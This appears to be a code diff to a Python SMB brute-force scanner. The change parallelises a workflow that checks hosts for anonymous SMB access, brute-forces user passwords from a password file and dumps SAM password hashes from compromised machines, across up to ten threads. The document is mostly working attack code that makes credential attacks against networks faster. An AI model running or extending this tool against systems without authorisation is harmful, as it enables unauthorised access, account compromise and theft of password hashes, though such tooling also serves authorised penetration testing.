@@ -20,6 +20,8 @@ import shutil
 import subprocess
 import time as _time
 import json
+import threading
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from typing import List, Dict, Optional, Set
 from dataclasses import dataclass, field
 
@@ -384,7 +386,6 @@ class SMBBruteScanner:
 
         scan_start = _time.time()
         self.results = {}
-        total_users_tested = 0
 
         self.stats.total_smb_hosts = len(smb_hosts)
 
@@ -396,16 +397,23 @@ class SMBBruteScanner:
             f"\033[92m{len(smb_hosts)}\033[0m SMB host(s) ..."
         )
 
-        for idx, ip in enumerate(sorted(smb_hosts.keys()), 1):
+        sorted_ips = sorted(smb_hosts.keys())
+        print_lock = threading.Lock()
+        completed = [0]
+        total = len(sorted_ips)
+
+        def _scan_one(ip: str) -> SMBBruteHostResult:
             smb_port = smb_hosts[ip]
             host_start = _time.time()
             host_result = SMBBruteHostResult(ip=ip, port=smb_port)
 
-            print(
-                f"\033[36m[>]\033[0m smb-brute: "
-                f"[\033[96m{idx}/{len(smb_hosts)}\033[0m] "
-                f"\033[96m{ip}:{smb_port}\033[0m"
-            )
+            with print_lock:
+                completed[0] += 1
+                print(
+                    f"\033[36m[>]\033[0m smb-brute: "
+                    f"[\033[96m{completed[0]}/{total}\033[0m] "
+                    f"\033[96m{ip}:{smb_port}\033[0m"
+                )
 
             # ── Step 1: Anonymous/Null auth check ────────────────────────
             anon_output = self._run_nxc_smb_anon(ip)
@@ -432,27 +440,29 @@ class SMBBruteScanner:
                 shares = self._parse_shares(anon_output)
                 host_result.shares = shares
 
-                print(
-                    f"    \033[1;91m[!]\033[0m \033[1;91mNULL AUTH\033[0m: "
-                    f"\033[96m{ip}\033[0m → "
-                    f"\033[1;91mAnonymous access allowed!\033[0m"
-                    f"{' — ' + ', '.join(s.name for s in shares[:5]) if shares else ''}"
-                )
+                with print_lock:
+                    print(
+                        f"    \033[1;91m[!]\033[0m \033[1;91mNULL AUTH\033[0m: "
+                        f"\033[96m{ip}\033[0m → "
+                        f"\033[1;91mAnonymous access allowed!\033[0m"
+                        f"{' — ' + ', '.join(s.name for s in shares[:5]) if shares else ''}"
+                    )
             else:
-                print(
-                    f"    \033[37m[-]\033[0m \033[96m{ip}\033[0m → "
-                    f"anonymous access denied"
-                )
+                with print_lock:
+                    print(
+                        f"    \033[37m[-]\033[0m \033[96m{ip}\033[0m → "
+                        f"anonymous access denied"
+                    )
 
             # ── Step 2: Brute-force with users + pass file ───────────────
             for username in test_users:
                 host_result.users_tested.append(username)
-                total_users_tested += 1
 
-                print(
-                    f"    \033[36m[>]\033[0m \033[96m{ip}\033[0m "
-                    f"brute-forcing \033[93m{username}\033[0m ..."
-                )
+                with print_lock:
+                    print(
+                        f"    \033[36m[>]\033[0m \033[96m{ip}\033[0m "
+                        f"brute-forcing \033[93m{username}\033[0m ..."
+                    )
 
                 brute_output = self._run_nxc_smb_brute(
                     ip, username, pass_file_path,
@@ -475,42 +485,46 @@ class SMBBruteScanner:
 
                         pwn_str = " \033[1;91m(Pwn3d!)\033[0m" if cred.pwned else ""
                         domain_str = f"{cred.domain}\\" if cred.domain else ""
-                        print(
-                            f"    \033[1;92m[+]\033[0m \033[1;92mSUCCESS\033[0m: "
-                            f"\033[96m{ip}\033[0m → "
-                            f"\033[1;92m{domain_str}{cred.username}:{cred.password}\033[0m"
-                            f"{pwn_str}"
-                        )
+                        with print_lock:
+                            print(
+                                f"    \033[1;92m[+]\033[0m \033[1;92mSUCCESS\033[0m: "
+                                f"\033[96m{ip}\033[0m → "
+                                f"\033[1;92m{domain_str}{cred.username}:{cred.password}\033[0m"
+                                f"{pwn_str}"
+                            )
 
                 # Check lockout — skip remaining users
                 if self._detect_lockout(brute_output):
                     host_result.skipped = True
                     host_result.skip_reason = "account lockout detected"
-                    print(
-                        f"    \033[93m[!]\033[0m smb-brute: {ip} — lockout detected, "
-                        f"skipping remaining users"
-                    )
+                    with print_lock:
+                        print(
+                            f"    \033[93m[!]\033[0m smb-brute: {ip} — lockout detected, "
+                            f"skipping remaining users"
+                        )
                     break
 
                 # Check rate limit / connection issues
                 if self._detect_rate_limit(brute_output):
                     host_result.skipped = True
                     host_result.skip_reason = "connection error / rate limit"
-                    print(
-                        f"    \033[93m[!]\033[0m smb-brute: {ip} — connection issues, "
-                        f"skipping remaining users"
-                    )
+                    with print_lock:
+                        print(
+                            f"    \033[93m[!]\033[0m smb-brute: {ip} — connection issues, "
+                            f"skipping remaining users"
+                        )
                     break
 
             # ── Step 3: SAM dump if Pwn3d! ───────────────────────────────
             pwned_creds = [c for c in host_result.credentials if c.pwned]
             if pwned_creds:
                 cred = pwned_creds[0]  # Use first pwned credential
-                print(
-                    f"    \033[36m[>]\033[0m \033[96m{ip}\033[0m "
-                    f"dumping SAM hashes (Pwn3d! with "
-                    f"\033[93m{cred.username}\033[0m) ..."
-                )
+                with print_lock:
+                    print(
+                        f"    \033[36m[>]\033[0m \033[96m{ip}\033[0m "
+                        f"dumping SAM hashes (Pwn3d! with "
+                        f"\033[93m{cred.username}\033[0m) ..."
+                    )
 
                 sam_output = self._run_nxc_smb_sam(
                     ip, cred.username, cred.password,
@@ -524,53 +538,68 @@ class SMBBruteScanner:
                 host_result.sam_hashes = sam_hashes
 
                 if sam_hashes:
-                    print(
-                        f"    \033[1;91m[!]\033[0m \033[1;91mSAM DUMP\033[0m: "
-                        f"\033[96m{ip}\033[0m → "
-                        f"\033[1;91m{len(sam_hashes)} hash(es) extracted!\033[0m"
-                    )
-                    for h in sam_hashes:
+                    with print_lock:
                         print(
-                            f"    \033[1;91m[!]\033[0m   "
-                            f"\033[93m{h.username}\033[0m:"
-                            f"\033[90m{h.rid}\033[0m:"
-                            f"\033[37m{h.lm_hash}\033[0m:"
-                            f"\033[1;97m{h.nt_hash}\033[0m:::"
+                            f"    \033[1;91m[!]\033[0m \033[1;91mSAM DUMP\033[0m: "
+                            f"\033[96m{ip}\033[0m → "
+                            f"\033[1;91m{len(sam_hashes)} hash(es) extracted!\033[0m"
                         )
+                        for h in sam_hashes:
+                            print(
+                                f"    \033[1;91m[!]\033[0m   "
+                                f"\033[93m{h.username}\033[0m:"
+                                f"\033[90m{h.rid}\033[0m:"
+                                f"\033[37m{h.lm_hash}\033[0m:"
+                                f"\033[1;97m{h.nt_hash}\033[0m:::"
+                            )
                 else:
-                    print(
-                        f"    \033[37m[-]\033[0m SAM dump returned no hashes"
-                    )
+                    with print_lock:
+                        print(
+                            f"    \033[37m[-]\033[0m SAM dump returned no hashes"
+                        )
 
             host_result.scan_time = _time.time() - host_start
-            self.results[ip] = host_result
 
             # Print per-host summary
             cred_count = len(host_result.credentials)
             anon_count = sum(1 for c in host_result.credentials if c.anonymous)
             real_creds = cred_count - anon_count
 
-            if real_creds > 0 or host_result.null_auth:
-                parts = []
-                if host_result.null_auth:
-                    parts.append("\033[1;91mNull Auth\033[0m")
-                if real_creds > 0:
-                    parts.append(f"\033[1;92m{real_creds} cred(s)\033[0m")
-                if host_result.sam_hashes:
-                    parts.append(f"\033[1;91m{len(host_result.sam_hashes)} SAM hash(es)\033[0m")
-                print(
-                    f"\033[1;92m[+]\033[0m smb-brute: \033[96m{ip}:{smb_port}\033[0m → "
-                    f"{' | '.join(parts)} "
-                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
-                )
-            elif host_result.skipped:
-                pass  # Already printed
-            else:
-                print(
-                    f"\033[37m[-]\033[0m smb-brute: "
-                    f"{ip}:{smb_port} — no valid credentials "
-                    f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
-                )
+            with print_lock:
+                if real_creds > 0 or host_result.null_auth:
+                    parts = []
+                    if host_result.null_auth:
+                        parts.append("\033[1;91mNull Auth\033[0m")
+                    if real_creds > 0:
+                        parts.append(f"\033[1;92m{real_creds} cred(s)\033[0m")
+                    if host_result.sam_hashes:
+                        parts.append(f"\033[1;91m{len(host_result.sam_hashes)} SAM hash(es)\033[0m")
+                    print(
+                        f"\033[1;92m[+]\033[0m smb-brute: \033[96m{ip}:{smb_port}\033[0m → "
+                        f"{' | '.join(parts)} "
+                        f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
+                    )
+                elif host_result.skipped:
+                    pass  # Already printed
+                else:
+                    print(
+                        f"\033[37m[-]\033[0m smb-brute: "
+                        f"{ip}:{smb_port} — no valid credentials "
+                        f"\033[90m({host_result.scan_time:.1f}s)\033[0m"
+                    )
+
+            return host_result
+
+        # ── Run parallel across hosts ─────────────────────────────────────────
+        max_workers = min(10, len(sorted_ips))
+        with ThreadPoolExecutor(max_workers=max_workers) as executor:
+            futures = {executor.submit(_scan_one, ip): ip for ip in sorted_ips}
+            for future in as_completed(futures):
+                try:
+                    host_result = future.result()
+                    self.results[host_result.ip] = host_result
+                except Exception:
+                    pass
 
         scan_elapsed = _time.time() - scan_start
 
